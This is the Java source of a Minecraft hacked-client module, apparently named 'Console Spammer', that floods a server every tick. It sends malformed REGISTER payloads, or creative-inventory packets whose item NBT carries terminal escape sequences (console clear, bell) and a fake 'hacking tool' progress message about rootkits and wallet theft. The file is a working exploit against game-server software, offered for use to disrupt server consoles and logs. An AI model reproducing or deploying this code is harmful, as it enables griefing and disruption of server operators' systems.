package me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import me.nekosarekawaii.foxglove.event.impl.TickListener;
import me.nekosarekawaii.foxglove.feature.FeatureCategory;
import me.nekosarekawaii.foxglove.feature.impl.module.Module;
import me.nekosarekawaii.foxglove.feature.impl.module.ModuleInfo;
import me.nekosarekawaii.foxglove.util.minecraft.via.ViaPackets;
import me.nekosarekawaii.foxglove.util.string.EnumNameNormalizer;
import me.nekosarekawaii.foxglove.util.timer.impl.ms.MsTimer;
import me.nekosarekawaii.foxglove.value.Value;
import me.nekosarekawaii.foxglove.value.values.ListValue;
import net.fabricmc.fabric.api.networking.v1.PacketByteBufs;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Identifier;

@ModuleInfo(name = "Console Spammer", description = "Tries to spamm's server consoles with text.", category = FeatureCategory.EXPLOIT)
public class ConsoleSpammerModule extends Module implements TickListener {

    private final Value<String> mode = new ListValue("Mode", "The current spamm mode.", this, Mode.RAW_PACKET.normalName(), Mode.ITEM.normalName());

    @Override
    protected void onEnable() {
        DietrichEvents2.global().subscribe(TickEvent.ID, this);
    }

    @Override
    protected void onDisable() {
        DietrichEvents2.global().unsubscribe(TickEvent.ID, this);
    }

    private int currentPercent = 0;
    private final MsTimer percentTimer = new MsTimer();
    private final static String title = "#####################################################\n  SEMI FULL BLOCK HACKING TOOL MADE BY LUCY HORNER\n#####################################################\n\n";
    private StringBuilder trollMsg = new StringBuilder(title);

    @Override
    public void onTick() {
        final ClientWorld world = mc.world;
        final ClientPlayerEntity player = mc.player;
        final ClientPlayNetworkHandler networkHandler = mc.getNetworkHandler();
        final ClientPlayerInteractionManager interactionManager = mc.interactionManager;
        if (world == null || player == null || networkHandler == null || interactionManager == null) {
            this.setState(false);
            return;
        }
        if (this.mode.getValue().equals(Mode.RAW_PACKET.normalName())) {
            ViaPackets.sendCustomPayload(new Identifier("REGISTER"), PacketByteBufs.create());
        } else if (this.mode.getValue().equals(Mode.ITEM.normalName())) {
            if (this.percentTimer.hasReached(100, true)) {
                this.currentPercent++;
                this.trollMsg.append(" > ");
                if (this.currentPercent > 0 && this.currentPercent <= 10) {
                    this.trollMsg.append("Cracking hashes");
                } else if (this.currentPercent > 10 && this.currentPercent <= 20) {
                    this.trollMsg.append("Searching for important files");
                } else if (this.currentPercent > 20 && this.currentPercent <= 30) {
                    this.trollMsg.append("Decrypting Password Hashes using Hash Executor");
                } else if (this.currentPercent > 30 && this.currentPercent <= 40) {
                    this.trollMsg.append("Installing root kit");
                } else if (this.currentPercent > 40 && this.currentPercent <= 50) {
                    this.trollMsg.append("Installing backdoor");
                } else if (this.currentPercent > 50 && this.currentPercent <= 60) {
                    this.trollMsg.append("Installing doom eternal");
                } else if (this.currentPercent > 60 && this.currentPercent <= 65) {
                    this.trollMsg.append("Installing Admin Evil Hack");
                } else if (this.currentPercent > 65 && this.currentPercent <= 70) {
                    this.trollMsg.append("Bruteforcing Remote Endpoint");
                } else if (this.currentPercent > 70 && this.currentPercent <= 80) {
                    this.trollMsg.append("Spawning Hot Minecraft E-Girls in all Chunks");
                } else if (this.currentPercent > 80 && this.currentPercent <= 99) {
                    this.trollMsg.append("Stealing BitCoin Wallet");
                } else {
                    this.currentPercent = 0;
                    this.trollMsg = new StringBuilder(title);
                }
                if (this.currentPercent > 0) {
                    this.trollMsg.append(" ");
                    this.trollMsg.append(this.currentPercent);
                    this.trollMsg.append("% ...");
                    this.trollMsg.append('\n');
                }
            }
            mc.itemUseCooldown = 0;
            final ItemStack stack = new ItemStack(Items.BAT_SPAWN_EGG);
            final NbtCompound nbt = new NbtCompound();
            final NbtCompound entitytag = new NbtCompound();
            final NbtCompound transformationNBT = new NbtCompound();
            final NbtList scale = new NbtList();
            final String space = "\n".repeat(10);
            scale.add(NbtString.of("\033c\u0007" + space + this.trollMsg + space));
            transformationNBT.put("scale", scale);
            transformationNBT.put("translation", new NbtCompound());
            entitytag.put("transformation", transformationNBT);
            entitytag.putString("id", "minecraft:text_display");
            nbt.put("EntityTag", entitytag);
            stack.setNbt(nbt);
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + player.getInventory().selectedSlot, stack));
        }
    }

    private enum Mode implements EnumNameNormalizer {

        RAW_PACKET, ITEM;

        private final String normalName;

        Mode() {
            this.normalName = this.normalizeName(this.name());
        }

        @Override
        public String normalName() {
            return this.normalName;
        }

    }

}
